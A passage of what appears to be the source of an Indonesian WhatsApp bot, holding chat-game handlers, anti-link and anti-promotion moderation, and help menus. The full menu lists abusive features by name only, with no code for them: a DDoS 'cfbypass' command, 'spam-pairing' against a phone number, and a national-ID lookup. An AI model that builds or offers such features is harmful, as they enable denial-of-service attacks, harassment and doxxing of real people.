dy.sendMessage(m.chat, {react: {text: '🟢', key: m.key}})
users.balance += 150
clearTimeout(waktu);
delete tebakgambar2[from];
} else dy.sendMessage(sender, {react: {text: '❌', key: m.key}})
}

if ((from in caklontong)) {
let { soal, jawaban, hadiah, waktu } = caklontong[from]

if (budy.toLowerCase() == "nyerah") {
m.reply(`*KAMU PAYAH ಠ⁠﹏⁠ಠ*\n\nJawabannya adalah *${jawaban}*`);
delete caklontong[from];
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
await m.reply(`Selamat Jawaban Kamu Benar🥳\n\nSoalan:\n${monospace(soal)}\nJawaban: ${jawaban}\nHadiah: $${hadiah} balance`);
users.balance += hadiah
clearTimeout(waktu);
delete caklontong[from];
} else falseR()
}

if ((from in family100)) {
let { soal, jawaban, hadiah, waktu } = family100[from]
for (let i of jawaban){
if (body.toLowerCase().includes(i)) {
let anu = jawaban.indexOf(i)
jawaban.splice(anu, 1)
await m.reply(`*GAME FAMILY 100*\n\nJawaban kamu benar!\nJawaban: ${i}\nHadiah: $${hadiah}\n\n${jawaban.length < 1 ? 'Selamat semua jawaban sudah tertebak!\ningin bermain lagi? kirim '+prefix+'family100' : 'Jawaban yang belum tertebak: '+jawaban.length}`)
users.balance += hadiah
} else falseR()
}
if (budy.toLowerCase() == "nyerah") {
let teks = `*KAMU PAYAH ಠ⁠﹏⁠ಠ*\n\nJawabannya adalah\n`
let jwb = jawaban
for (let i of jwb){teks += `\n${i}`}
m.reply(teks)
delete family100[from];
clearTimeout(waktu);
}
if (jawaban.length < 1){
clearTimeout(waktu);
delete family100[from];
}
}

if ((from in tebakbendera)) {
let { soal, jawaban, hadiah, waktu } = tebakbendera[from]

if (budy.toLowerCase() == "nyerah") {
m.reply(`*KAMU PAYAH ಠ⁠﹏⁠ಠ*\n\nJawabannya adalah *${jawaban}*`);
delete tebakbendera[from];
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
await m.reply(`Selamat Jawaban Kamu Benar🥳\n\nSoalan: ${monospace(soal)}\nJawaban: ${jawaban}\nHadiah: $${hadiah} balance`);
users.balance += hadiah
clearTimeout(waktu);
delete tebakbendera[from];
} else falseR()
}

let roof = Object.values(suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(sender))
if (roof) {
let win = ''
let tie = false
if (sender == roof.p2 && /^(acc(ept)?|y|gas|oke?|tolak|gamau|nanti|ga(k.)?bisa|y)/i.test(body) && m.isGroup && roof.status == 'wait') {
if (/^(gamau|nanti|ga(k.)?bisa)/i.test(body)) {
global.db.data.users[m.sender].balance -= 1000
pokl = `@${roof.p2.split('@')[0]} menolak suit, suit dibatalkan\nDan player dikenakan sanksi -1000 balance karna menolak ajakan pemain`
await dy.sendTextWithMentions(from, pokl, m)
delete suit[roof.id]
return !0
}
roof.status = 'play'
roof.asal = from
clearTimeout(roof.waktu)

teksbbb = `AYO PILIH SUIT MU`
ggy = `Suit telah dikirimkan ke chat

@${roof.p.split('@')[0]} dan @${roof.p2.split('@')[0]}

Silahkan pilih suit di nomor bot"
➩ wa.me/${botNumber.split('@')[0]}`
await dy.sendMessage(m.chat, {text: 'Suit telah dikirimkan ke chat\nSilahkan pilih suit di chat masing²', contextInfo: {mentionedJid: [roof.p, roof.p2]}}, {quoted: fverif})
if (!roof.pilih) await dy.sendTextWithMentions(roof.p, `*Silahkan pilih dibawah ini :*\n✂ Gunting\n📄 Kertas\n🗿 Batu\n\nContoh jika kamu ingin memilih gunting ketik *Gunting*`, m)
if (!roof.pilih2) await dy.sendTextWithMentions(roof.p2, `*Silahkan pilih dibawah ini :*\n✂ Gunting\n📄 Kertas\n🗿 Batu\n\nContoh jika kamu ingin memilih gunting ketik *Gunting*`, m)
roof.waktu_milih = setTimeout(async() => {
if (!roof.pilih && !roof.pilih2) await dy.sendMessage(from, {text: `Kedua pemain tidak niat main,\nSuit dibatalkan`})
else if (!roof.pilih || !roof.pilih2) {
win = !roof.pilih ? roof.p2 : roof.p
global.db.data.users[m.sender].balance -= 1000
sffp = `@${(roof.pilih ? roof.p2 : roof.p).split('@')[0]} tidak memilih suit, game berakhir\nDan Player dikenakan sanksi pengurangan Rp. 1,000 saldo karna menolak ajakan pemain`
await reply(sffp)
}
delete suit[roof.id]
return !0
}, roof.timeout)
}
let jwb = sender == roof.p
let jwb2 = sender == roof.p2
let g = /gunting/i
let b = /batu/i
let k = /kertas/i
let reg = /^(gunting|batu|kertas)/i
if (jwb && reg.test(body) && !roof.pilih && !m.isGroup) {
roof.pilih = reg.exec(budy.toLowerCase())[0]
roof.text = body
await dy.sendMessage(from, {text: `Kamu telah memilih ${body} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`}, {quoted:kalgans})
if (!roof.pilih2) await dy.sendMessage(roof.p2, {text: '_Lawan sudah memilih_\nSekarang giliran kamu'})
}
if (jwb2 && reg.test(body) && !roof.pilih2 && !m.isGroup) {
roof.pilih2 = reg.exec(budy.toLowerCase())[0]
roof.text2 = body

tyu = `Kamu telah memilih ${body} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`
await dy.sendMessage(from, {text: tyu}, {quoted:m})

if (!roof.pilih) await dy.sendMessage(roof.p, {text: '_Lawan sudah memilih_\nSekarang giliran kamu'})
}
let stage = roof.pilih
let stage2 = roof.pilih2
if (roof.pilih && roof.pilih2) {
clearTimeout(roof.waktu_milih)
if (b.test(stage) && g.test(stage2)) win = roof.p
else if (b.test(stage) && k.test(stage2)) win = roof.p2
else if (g.test(stage) && k.test(stage2)) win = roof.p
else if (g.test(stage) && b.test(stage2)) win = roof.p2
else if (k.test(stage) && b.test(stage2)) win = roof.p
else if (k.test(stage) && g.test(stage2)) win = roof.p2
else if (stage == stage2) tie = true
await dy.sendTextWithMentions(roof.asal, `${tie ? '*HASIL SERI*\n\n' : ''}@${roof.p.split('@')[0]} *${roof.text}* ${tie ? '' : roof.p == win ? ' Menang' : ' Kalah'}\n@${roof.p2.split('@')[0]} *${roof.text2}* ${tie ? '' : roof.p2 == win ? ' Menang' : ' Kalah'}${tie ? '' : '\n\nHadiah Balance : 1000 '}`)
if (roof.p == win) {
global.db.data.users[roof.p].balance += 1000
} else if (roof.p2 == win) {
global.db.data.users[roof.p2].balance += 1000
}
delete suit[roof.id]
}
}

const isTicTacToe = (from, _dir) => {
let status = false
Object.keys(_dir).forEach((i) => {
if (_dir[i].id === from) {
status = true
}
})
return status
}
const getPosTic = (from, _dir) => {
let position = null
Object.keys(_dir).forEach((i) => {
if (_dir[i].id === from) {
position = i
}
})
if (position !== null) {
return position
}
}
const KeisiSemua = (tic) => {
let status = true
for (let i of tic){
if (i !== '❌' && i !== '⭕'){
status = false
}
}
return status
}
const cekIsi = (nomor, tic) => {
let status = false
if (tic[nomor] === '❌' || tic[nomor] === '⭕'){
status = true
}
return status
}
const cekTicTac = (tic) => {
let status = false
if (tic[0] === '❌' && tic[1] === '❌' && tic[2] === '❌' || tic[0] === '⭕' && tic[1]=== '⭕' && tic[2] === '⭕'){
status = true
} else if (tic[3] === '❌' && tic[4] === '❌' && tic[5] === '❌' || tic[3] === '⭕' && tic[4] === '⭕' && tic[5] === '⭕'){
status = true
} else if (tic[6] === '❌' && tic[7] === '❌' && tic[8] === '❌' || tic[6] === '⭕' && tic[7] === '⭕' && tic[8] === '⭕'){
status = true
} else if (tic[0] === '❌' && tic[3] === '❌' && tic[6] === '❌' || tic[0] === '⭕' && tic[3] === '⭕' && tic[6] === '⭕'){
status = true
} else if (tic[1] === '❌' && tic[4] === '❌' && tic[7] === '❌' || tic[1] === '⭕' && tic[4] === '⭕' && tic[7] === '⭕'){
status = true
} else if (tic[2] === '❌' && tic[5] === '❌' && tic[8] === '❌' || tic[2] === '⭕' && tic[5] === '⭕' && tic[8] === '⭕'){
status = true
} else if (tic[0] === '❌' && tic[4] === '❌' && tic[8] === '❌' || tic[0] === '⭕' && tic[4] === '⭕' && tic[8] === '⭕'){
status = true
} else if (tic[2] === '❌' && tic[4] === '❌' && tic[6] === '❌' || tic[2] === '⭕' && tic[4] === '⭕' && tic[6] === '⭕'){
status = true
}
return status 
}
if (isTicTacToe(from, tictactoe)) {
try {
// TicTacToe
if (isTicTacToe(from, tictactoe)){
let nomor = [1, 2, 3, 4, 5, 6, 7, 8, 9]
let posi = tictactoe[from]
let anu = posi.TicTacToe
if (posi.status === null){
if (sender === posi.ditantang){
if (body.toLowerCase() === 'y'){
the = `@${posi.ditantang.split('@')[0]} menerima tantangan

@${posi.penantang.split('@')[0]} = ❌
@${posi.ditantang.split('@')[0]} = ⭕

${anu[0]}${anu[1]}${anu[2]}
${anu[3]}${anu[4]}${anu[5]}
${anu[6]}${anu[7]}${anu[8]}

Giliran @${posi.penantang.split('@')[0]}`
dy.sendText(from, the, m)

tictactoe[from].status = true
} else if (body.toLowerCase() === 'n'){
db.data.users[m.sender].balance -= 100
the1 = `@${posi.ditantang.split('@')[0]} menolak, game dibatalkan\nDan Player dikenakan sanksi -100 balance karna menolak ajakan pemain`
dy.sendText(from, the1, m)
delete tictactoe[from];
}
}
} else if (posi.status === true){
if (sender === posi.penantang){
for (let i of nomor){
if (Number(body) === i){
if (cekIsi(Number(body) - 1, anu)) return m.reply(`Nomor tersebut sudah terisi`)
tictactoe[from].TicTacToe[Number(body) - 1] = '❌'
if (cekTicTac(tictactoe[from].TicTacToe)){
the2 = `@${posi.penantang.split('@')[0]} Menang

@${posi.penantang.split('@')[0]} = ❌
@${posi.ditantang.split('@')[0]} = ⭕

${anu[0]}${anu[1]}${anu[2]}
${anu[3]}${anu[4]}${anu[5]}
${anu[6]}${anu[7]}${anu[8]}

Hadiah : ${posi.hadiah} balance
Ingin bermain lagi? ${prefix}tictactoe`
dy.sendText(from, the2, m)
global.db.data.users[posi.penantang].balance += posi.hadiah
global.db.data.users[posi.ditantang].balance -= posi.hadiah
delete tictactoe[from];
} else if (KeisiSemua(anu)) {
the3 = `*HASIL SERI*

@${posi.penantang.split('@')[0]} = ❌
@${posi.ditantang.split('@')[0]} = ⭕

${anu[0]}${anu[1]}${anu[2]}
${anu[3]}${anu[4]}${anu[5]}
${anu[6]}${anu[7]}${anu[8]}

Ingin bermain lagi? ${prefix}tictactoe`
dy.sendText(from, the3, m)

delete tictactoe[from];
} else {
the4 = `@${posi.penantang.split('@')[0]} telah mengisi

@${posi.penantang.split('@')[0]} = ❌
@${posi.ditantang.split('@')[0]} = ⭕

${anu[0]}${anu[1]}${anu[2]}
${anu[3]}${anu[4]}${anu[5]}
${anu[6]}${anu[7]}${anu[8]}

Giliran @${posi.ditantang.split('@')[0]}`
dy.sendText(from, the4, m)

tictactoe[from].status = false
}
}
}
}
} else if (posi.status === false){
if (sender === posi.ditantang){
for (let i of nomor){
if (Number(body) === i){
if (cekIsi(Number(body) - 1, anu)) return m.reply(`Nomor tersebut sudah terisi`)
tictactoe[from].TicTacToe[Number(body) - 1] = '⭕' 
if (cekTicTac(anu)){
the5 = `@${posi.ditantang.split('@')[0]} Menang

@${posi.penantang.split('@')[0]} = ❌
@${posi.ditantang.split('@')[0]} = ⭕

${anu[0]}${anu[1]}${anu[2]}
${anu[3]}${anu[4]}${anu[5]}
${anu[6]}${anu[7]}${anu[8]}

Hadiah : ${posi.hadiah} balance
Ingin bermain lagi? ${prefix}tictactoe`
dy.sendText(from, the5, m)
global.db.data.users[posi.ditantang].balance += posi.hadiah
global.db.data.users[posi.penantang].balance -= posi.hadiah
delete tictactoe[from];
} else if (KeisiSemua(anu)) {
the6 = `Hasil Seri

@${posi.penantang.split('@')[0]} = ❌
@${posi.ditantang.split('@')[0]} = ⭕

${anu[0]}${anu[1]}${anu[2]}
${anu[3]}${anu[4]}${anu[5]}
${anu[6]}${anu[7]}${anu[8]}

Ingin bermain lagi? ${prefix}tictactoe`
dy.sendText(from, the6, m)

delete tictactoe[from];
} else {
the7 = `@${posi.ditantang.split('@')[0]} telah mengisi

@${posi.penantang.split('@')[0]} = ❌
@${posi.ditantang.split('@')[0]} = ⭕

${anu[0]}${anu[1]}${anu[2]}
${anu[3]}${anu[4]}${anu[5]}
${anu[6]}${anu[7]}${anu[8]}

Giliran @${posi.penantang.split('@')[0]}`
dy.sendText(from, the7, m)

tictactoe[from].status = true
}
}
}
}
}
}
} catch (err){
console.log(chalk.redBright('[ ERROR TICTACTOE ]'), err)
}
}

//Batas Respons Game
//DATABASE 
  
  
  


const totalFitur = () =>{
            var mytext = fs.readFileSync("./dycoders.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length;
            return numUpper
        }
let promosi = {};
const promosiFilePath = './database/databasepromosi.json';

let kataPromosi = [];
const kataPromosiFilePath = './database/antipromosi.json';

if (fs.existsSync(promosiFilePath)) {
    try {
        promosi = JSON.parse(fs.readFileSync(promosiFilePath));
    } catch (error) {
        promosi = {};
    }
}

if (fs.existsSync(kataPromosiFilePath)) {
    try {
        kataPromosi = JSON.parse(fs.readFileSync(kataPromosiFilePath));
    } catch (error) {
        kataPromosi = ["OPEN", "JUAL", "JASGEN", "JASJOK", "BOKEP", "FILE"];
    }
}

let violations = {};
const filePath = './database/antilink.json';

if (fs.existsSync(filePath)) {
    try {
        violations = JSON.parse(fs.readFileSync(filePath));
    } catch (error) {
        violations = {};
    }
}

if (chats.antipromosi && !m.key.fromMe && !isCreator && !isAdmins && isBotAdmins) {
    for (let kata of kataPromosi) {
        if (body.toUpperCase().includes(kata)) {
            const groupId = m.chat;
            const userId = m.sender;

            if (!promosi[groupId]) {
                promosi[groupId] = {};
            }

            promosi[groupId][userId] = (promosi[groupId][userId] || 0) + 1;

            fs.writeFileSync(promosiFilePath, JSON.stringify(promosi, null, 2));

            const warningCount = promosi[groupId][userId];

            await dy.sendMessage(from, {
                delete: {
                    remoteJid: m.chat,
                    id: m.id,
                    participant: m.sender,
                },
            });

            if (warningCount >= 1 && warningCount <= 3) {
                reply(`⚠️ *Peringatan ${warningCount}!* Jangan kirim kata promosi di sini!`);
            } else if (warningCount === 4) {
                await dy.groupParticipantsUpdate(from, [userId], 'remove');
                delete promosi[groupId][userId];
                if (Object.keys(promosi[groupId]).length === 0) {
                    delete promosi[groupId];
                }
                fs.writeFileSync(promosiFilePath, JSON.stringify(promosi, null, 2));
                reply(`🚫 *${m.pushName} telah dikeluarkan karena melanggar aturan promosi!*`);
            }
            break;
        }
    }
}

if (chats.antilink && !m.key.fromMe && !isCreator && !isAdmins && isBotAdmins) {
    if (body.match(`chat.whatsapp.com`)) {
        const groupId = m.chat; 
        const userId = m.sender; 

        if (!violations[groupId]) {
            violations[groupId] = {};
        }

        violations[groupId][userId] = (violations[groupId][userId] || 0) + 1;

        fs.writeFileSync(filePath, JSON.stringify(violations, null, 2));

        const warningCount = violations[groupId][userId];

        await dy.sendMessage(from, {
            delete: {
                remoteJid: m.chat,
                id: m.id,
                participant: m.sender,
            },
        });

        if (warningCount >= 1 && warningCount <= 3) {
            reply(`⚠️ *Peringatan ${warningCount}!* Jangan kirim link grup di sini!`);
        } else if (warningCount === 4) {
            await dy.groupParticipantsUpdate(from, [userId], 'remove');
            delete violations[groupId][userId];
            if (Object.keys(violations[groupId]).length === 0) {
                delete violations[groupId];
            }
            fs.writeFileSync(filePath, JSON.stringify(violations, null, 2));
            reply(`🚫 *${m.pushName} telah dikeluarkan karena melanggar aturan!*`);
        }
    }
}


//BATAS DATABASE 


//BATAS DATABASE 
switch(command) {
case'menu': case'dycoders': {
const totalMem = os.totalmem();
const freeMem = os.freemem();
const usedMem = totalMem - freeMem;
const formattedUsedMem = formatSize(usedMem);
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
const formattedTotalMem = formatSize(totalMem);
if (args.length < 1) return replymenu(`Hi, I am dy_net who is ready to serve you. I was developed by dycoders.xyz. If you need help, I can help you.

— *Info Bot*
▢ Baileys: whiskeysockets
▢ Developer: ${ownername}
▢ Bot Name: ${botname}
▢ Pendaftar: ${pendaftar.length} User
▢ type: Case
▢ status: SEDANG CODING

— *Info Users*
▢ User: ${isPremium ? 'Premium' : 'Free'}
▢ Limit: ${limitnya}
▢ Balance: $${toRupiah(balancenya)}
▢ Number: ${m?.sender.split('@')[0]}


*FOR YOU ${m?.sender.split('@')[0]}*

${hiasan}menu all
${hiasan}menu owner
${hiasan}menu main
${hiasan}menu download
${hiasan}menu convert
${hiasan}menu search
${hiasan}menu group
${hiasan}menu game
${hiasan}menu ai
${hiasan}menu tools
${hiasan}menu store
${hiasan}menu jadibot
${hiasan}menu cpanel

*© dycoders.xyz*

`)
if (args[0] === "all") {
return replymenu(`Hi, I am a dy_net who is ready to serve you. I was developed by dycoders.xyz. If you need help, I can help you.

— *Info Bot*
▢ Baileys: whiskeysockets
▢ Developer: ${ownername}
▢ Bot Name: ${botname}
▢ Pendaftar: ${pendaftar.length} User
▢ type: Case

— *Info Users*
▢ User: ${isPremium ? 'Premium' : 'Free'}
▢ Limit: ${limitnya}
▢ Balance: $${toRupiah(balancenya)}
▢ Number: ${m?.sender.split('@')[0]}

*Owner Menu*
${woidy}blacklist
${woidy}unblacklist
${woidy}delprem [ Tag Number ]
${woidy}addprem [ Tag Number ]
${woidy}createredeem [ name|3 ]
${woidy}addexp [ Tag Number ]
${woidy}banuser [ Number ]
${woidy}unbanuser [ Number ]
${woidy}addbalance [ Number ]
${woidy}addlimit [ Number ]
${woidy}spam-pairing [ Number ]
${woidy}addcase
${woidy}dellcase
${woidy}banchat
${woidy}unbanchat
${woidy}listprem 
${woidy}getcase
${woidy}sendcase
${woidy}self
${woidy}setreply
${woidy}runtime
${woidy}cls [ Reply Sticker ]
${woidy}del [ Reply ]
${woidy}public
${woidy}backup
${woidy}delsesi
${woidy}backupdb
${woidy}setppbot [ Send Image ]
${woidy}setbotname

*Main Menu*
${woidy}redeem 
${woidy}totalfitur 
${woidy}me
${woidy}claim
${woidy}bulanan
${woidy}ping
${woidy}saldo
${woidy}tqto [ Developer]
${woidy}owner [ Developer]
${woidy}transfer
${woidy}saving
${woidy}report [ Kalo Fitur Eror ]

*Download Menu*
${woidy}spotifydl [ Link ]
${woidy}play [ Question ]
${woidy}audio [ Reply ]
${woidy}video [ Reply ]
${woidy}mediafire [ Link ]
${woidy}tiktok [ Link ]
${woidy}autodl 
${woidy}ytmp4 [ Link ]
${woidy}ytmp3 [ Link ]

*Tools Menu*
${woidy}removebg
${woidy}translate
${woidy}gitclone
${woidy}tts
${woidy}ceknik [nik]
${woidy}enc
${woidy}sendemail
${woidy}getpp [ Reply ]
${woidy}rvo
${woidy}ocr [ Reply Image ]
${woidy}hentaivid [random vidio]

*Convert Menu*
${woidy}smeme [ Text ]
${woidy}sticker [ Reply Image ]
${woidy}qc [ Text ]
${woidy}toimg [ Reply Sticker ]
${woidy}tovn [ Reply video ]
${woidy}tourl [ Reply Image ]
${woidy}searchaubdo
${woidy}remini [ Reply Image ]
${woidy}hd [ Image ]
${woidy}tovid [ Reply Sticker ]
${woidy}upvidey [ Reply Video ]
${woidy}stext [ Question ]

*Search Menu*
${woidy}play2 [ Question ]
${woidy}play [ query ]
${woidy}splay [ query ]
${woidy}soundcloud [ query ]
${woidy}searchimage [ Question ]
${woidy}tiktoks [ Question ]
${woidy}spotifysearch [ Judul ]
${woidy}pin [ Question ]

*Group Menu*
${woidy}acc
${woidy}kick [ Tag Target ]
${woidy}opentime [ Time ]
${woidy}closetime [ Time ]
${woidy}promote [ Tag ]
${woidy}demote [ Tag ]
${woidy}antilinkv1 [ enable/disable ]
${woidy}welcome [ on/off ]
${woidy}cekasalmember
${woidy}setppgc
${woidy}hidetag [ Pesan ]
${woidy}creategc [ Name ]
${woidy}setnamagc [ Name ]
${woidy}linkgc

*Game Menu*
${woidy}casino
${woidy}family100
${woidy}caklontong
${woidy}tebakgambar
${woidy}tebakbendera
${woidy}coin
${woidy}slot
${woidy}tictactoe
${woidy}delttt
${woidy}suit

*Ai Menu*
${woidy}askgpt [teks]
${woidy}ai [teks]

*Store Menu*
${woidy}done
${woidy}tunda
${woidy}batal

*Jadibot Menu*
${woidy}jadibot
${woidy}stopjadibot
${woidy}listjadibot

*Ddos Featured*
${woidy}cfbypass

*Cpanel Menu*
${woidy}1gb
${woidy}2gb
${woidy}3gb
${woidy}4gb
${woidy}5gb
${woidy}6gb
${woidy}7gb
${woidy}unli
${woidy}listsrv
${woidy}delsrv
${woidy}listusr
${woidy}delusr
${woidy}createadmin
${woidy}listadmin
`)
} if (args[0] === "owner") {
 return replymenu(`Hi, I am a dy_net who is ready to serve you. I was developed by dycoders.xyz. If you need help, I can help you.
— *Info Bot*
▢ Baileys: whiskeysockets
▢ Developer: ${ownername}
▢ Bot Name: ${botname}
▢ Pendaftar: ${pendaftar.length} User
▢ type: Case

— *Info Users*
▢ User: ${isPremium ? 'Premium' : 'Free'}
▢ Limit: ${limitnya}
▢ Balance: $${toRupiah(balancenya)}
▢ Number: ${m?.sender.split('@')[0]}

*Owner Menu*
${woidy}blacklist
${woidy}unblacklist
${woidy}delprem [ Tag Number ]
${woidy}addprem [ Tag Number ]
${woidy}createredeem [ name|3 ]
${woidy}addexp [ Tag Number ]
${woidy}banuser [ Number ]
${woidy}unbanuser [ Number ]
${woidy}addbalance [ Number ]
${woidy}addlimit [ Number ]
${woidy}spam-pairing [ Number ]
${woidy}addcase
${woidy}dellcase
${woidy}banchat
${woidy}unbanchat
${woidy}listprem 
${woidy}getcase
${woidy}sendcase
${woidy}self
${woidy}setreply
${woidy}runtime
${woidy}cls [ Reply Sticker ]
${woidy}del [ Reply ]
${woidy}public
${woidy}backup
${woidy}delsesi
${woidy}backupdb
${woidy}setppbot [ Send Image ]
${woidy}setbotname
`)
} if (args[0] === "main") {
return replymenu(`Hi, I am a dy_net who is ready to serve you. I was developed by dycoders.xyz. If you need help, I can help you.
— *Info Bot*
▢ Baileys: whiskeysockets
▢ Developer: ${ownername}
▢ Bot Name: ${botname}
▢ Pendaftar: ${pendaftar.length} User
▢ type: Case

— *Info Users*
▢ User: ${isPremium ? 'Premium' : 'Free'}
▢ Limit: ${limitnya}
▢ Balance: $${toRupiah(balancenya)}
▢ Number: ${m?.sender.split('@')[0]}

*Main Menu*
${woidy}redeem 
${woidy}totalfitur
${woidy}me
${woidy}claim
${woidy}bulanan
${woidy}ping
${woidy}saldo
${woidy}tqto [ Developer]
${woidy}owner [ Developer]
${woidy}transfer
${woidy}saving
${woidy}report [ Kalo Fitur Eror ]
`)
} if (args[0] === "download") {
return replymenu(`Hi, I am a dy_net who is ready to serve you. I was developed by dycoders.xyz. If you need help, I can help you.
— *Info Bot*
▢ Baileys: whiskeysockets
▢ Developer: ${ownername}
▢ Bot Name: ${botname}
▢ Pendaftar: ${pendaftar.length} User
▢ type: Case

— *Info Users*
▢ User: ${isPremium ? 'Premium' : 'Free'}
▢ Limit: ${limitnya}
▢ Balance: $${toRupiah(balancenya)}
▢ Number: ${m?.sender.split('@')[0]}

*Download Menu*
${woidy}spotifydl [ Link ]
${woidy}play [ Question ]
${woidy}audio [ Reply ]
${woidy}video [ Reply ]
${woidy}mediafire [ Link ]
${woidy}tiktok [ Link ]
${woidy}ytmp4 [ Link ]
${woidy}ytmp3 [ Link ]
`)
} if (args[0] === "convert") {
 return replymenu(`Hi, I am a dy_net who is ready to serve you. I was developed by dycoders.xyz. If you need help, I can help you.
— *Info Bot*
▢ Baileys: whiskeysockets
▢ Developer: ${ownername}
▢ Bot Name: ${botname}
▢ Pendaftar: ${pendaftar.length} User
▢ type: Case

— *Info Users*
▢ User: ${isPremium ? 'Premium' : 'Free'}
▢ Limit: ${limitnya}
▢ Balance: $${toRupiah(balancenya)}
▢ Number: ${m?.sender.split('@')[0]}

*Convert Menu*
${woidy}smeme [ Text ]
${woidy}sticker [ Reply Image ]
${woidy}qc [ Text ]
${woidy}toimg [ Reply Sticker ]
${woidy}tovn [ Reply video ]
${woidy}tourl [ Reply Image ]
${woidy}searchaubdo
${woidy}remini [ Reply Image ]
${woidy}hd [ Image ]
${woidy}tovid [ Reply Sticker ]
${woidy}upvidey [ Reply Video ]
${woidy}stext [ Question ]
`)
} if (args[0] === "search") {
return replymenu(`Hi, I am a dy_net who is ready to serve you. I was developed by dycoders.xyz. If you need help, I can help you.
— *Info Bot*
▢ Baileys: whiskeysockets
▢ Developer: ${ownername}
▢ Bot Name: ${botname}
▢ Pendaftar: ${pendaftar.length} User
▢ type: Case

— *Info Users*
▢ User: ${isPremium ? 'Premium' : 'Free'}
▢ Limit: ${limitnya}
▢ Balance: $${toRupiah(balancenya)}
▢ Number: ${m?.sender.split('@')[0]}

*Search Menu*
${woidy}play2 [ Question ]
${woidy}splay [ Question ]
${woidy}soundcloud [ Question ]
${woidy}gimage [ Question ]
${woidy}tiktoks [ Question ]
${woidy}spotifysearch [ Judul ]
${woidy}pin [ Question ]
`)
} if (args[0] === "group") {
return replymenu(`Hi, I am a dy_net who is ready to serve you. I was developed by dycoders.xyz. If you need help, I can help you.
— *Info Bot*
▢ Baileys: whiskeysockets
▢ Developer: ${ownername}
▢ Bot Name: ${botname}
▢ Pendaftar: ${pendaftar.length} User
▢ type: Case

— *Info Users*
▢ User: ${isPremium ? 'Premium' : 'Free'}
▢ Limit: ${limitnya}
▢ Balance: $${toRupiah(balancenya)}
▢ Number: ${m?.sender.split('@')[0]}

*Group Menu*
${woidy}acc
${woidy}kick [ Tag Target ]
${woidy}opentime [ Time ]
${woidy}closetime [ Time ]
${woidy}promote [ Tag ]
${woidy}demote [ Tag ]
${woidy}antilinkv1 [ enable/disable ]
${woidy}welcome [ on/off ]
${woidy}cekasalmember
${woidy}setppgc
${woidy}hidetag [ Pesan ]
${woidy}creategc [ Name ]
${woidy}setnamagc [ Name ]
${woidy}linkgc
`)
} if (args[0] === "game") {
return replymenu(`Hi, I am a dy_net who is ready to serve you. I was developed by dycoders.xyz. If you need help, I can help you.
— *Info Bot*
▢ Baileys: whiskeysockets
▢ Developer: ${ownername}
▢ Bot Name: ${botname}
▢ Pendaftar: ${pendaftar.length} User
▢ type: Case

— *Info Users*
▢ User: ${isPremium ? 'Premium' : 'Free'}
▢ Limit: ${limitnya}
▢ Balance: $${toRupiah(balancenya)}
▢ Number: ${m?.sender.split('@')[0]}

*Game Menu*
${woidy}casino
${woidy}family100
${woidy}caklontong
${woidy}tebakgambar
${woidy}tebakbendera
${woidy}coin
${woidy}slot
${woidy}tictactoe
${woidy}delttt
${woidy}suit
`)
} if (args[0] === "ai") {
return replymenu(`Hi, I am a dy_net who is ready to serve you. I was developed by dycoders.xyz. If you need help, I can help you.
— *Info Bot*
▢ Baileys: whiskeysockets
▢ Developer: ${ownername}
▢ Bot Name: ${botname}
▢ Pendaftar: ${pendaftar.length} User
▢ type: Case

— *Info Users*
▢ User: ${isPremium ? 'Premium' : 'Free'}
▢ Limit: ${limitnya}
▢ Balance: $${toRupiah(balancenya)}
▢ Number: ${m?.sender.split('@')[0]}

*menu ai*
${woidy}askgpt [text]
${woidy}ai [text]
`)
} if (args[0] === "store") {
return replymenu(`Hi, I am a dy_net who is ready to serve you. I was developed by dycoders.xyz. If you need help, I can help you.
— *Info Bot*
▢ Baileys: whiskeysockets
▢ Developer: ${ownername}
▢ Bot Name: ${botname}
▢ Pendaftar: ${pendaftar.length} User
▢ type: Case

— *Info Users*
▢ User: ${isPremium ? 'Premium' : 'Free'}
▢ Limit: ${limitnya}
▢ Balance: $${toRupiah(balancenya)}
▢ Number: ${m?.sender.split('@')[0]}

*Store Menu*
${woidy}done
${woidy}tunda
${woidy}batal
`)
} if (args[0] === "tools") {
 return replymenu(`Hi, I am a dy_net who is ready to serve you. I was developed by dycoders.xyz. If you need help, I can help you.
— *Info Bot*
▢ Baileys: whiskeysockets
▢ Developer: ${ownername}
▢ Bot Name: ${botname}
▢ Pendaftar: ${pendaftar.length} User
▢ type: Case

— *Info Users*
▢ User: ${isPremium ? 'Premium' : 'Free'}
▢ Limit: ${limitnya}
▢ Balance: $${toRupiah(balancenya)}
▢ Number: ${m?.sender.split('@')[0]}

*Tools Menu*
${woidy}removebg
${woidy}translate
${woidy}gitclone
${woidy}tts
${woidy}ceknik [nik]
${woidy}enc
${woidy}sendemail
${woidy}getpp [ Reply ]
${woidy}rvo
${woidy}ocr [ Reply Image ]
`)
} if (args[0] === "jadibot") {
return replymenu(`Hi, I am a dy_net who is ready to serve you. I was developed by dycoders.xyz. If you need help, I can help you.
— *Info Bot*
▢ Baileys: whiskeysockets
▢ Developer: ${ownername}
▢ Bot Name: ${botname}
▢ Pendaftar: ${pendaftar.length} User
▢ type: Case

— *Info Users*
▢ User: ${isPremium ? 'Premium' : 'Free'}
▢ Limit: ${limitnya}
▢ Balance: $${toRupiah(balancenya)}
▢ Number: ${m?.sender.split('@')[0]}

*Jadibot Menu*
${woidy}jadibot
${woidy}stopjadibot
${woidy}listjadibot
`)
} if (args[0] === "cpanel") {
return replymenu(`Hi, I am a dy_net who is ready to serve you. I was developed by dycoders.xyz. If you need help, I can help you.
— *Info Bot*
▢ Baileys: whiskeysockets
▢ Developer: ${ownername}
▢ Bot Name: ${botname}
▢ Pendaftar: ${pendaftar.length} User
▢ type: Case

— *Info Users*
▢ User: ${isPremium ? 'Premium' : 'Free'}
▢ Limit: ${limitnya}
▢ Balance: $${toRupiah(balancenya)}
▢ Number: ${m?.sender.split('@')[0]}

*Cpanel Menu*
${woidy}1gb
${woidy}2gb
${woidy}3gb
${woidy}4gb
${woidy}5gb
${woidy}6gb
${woidy}7gb
${woidy}unli
${woidy}listsrv
${woidy}delsrv
${woidy}listusr
${woidy}delusr
${woidy}createadmin
${woidy}listadmin
`)}}
break
 case'prabowo-ai':{
if (!text) return reply(`*Example:* ${prefix + command} Haii, Perkenalkan Dirimu`)
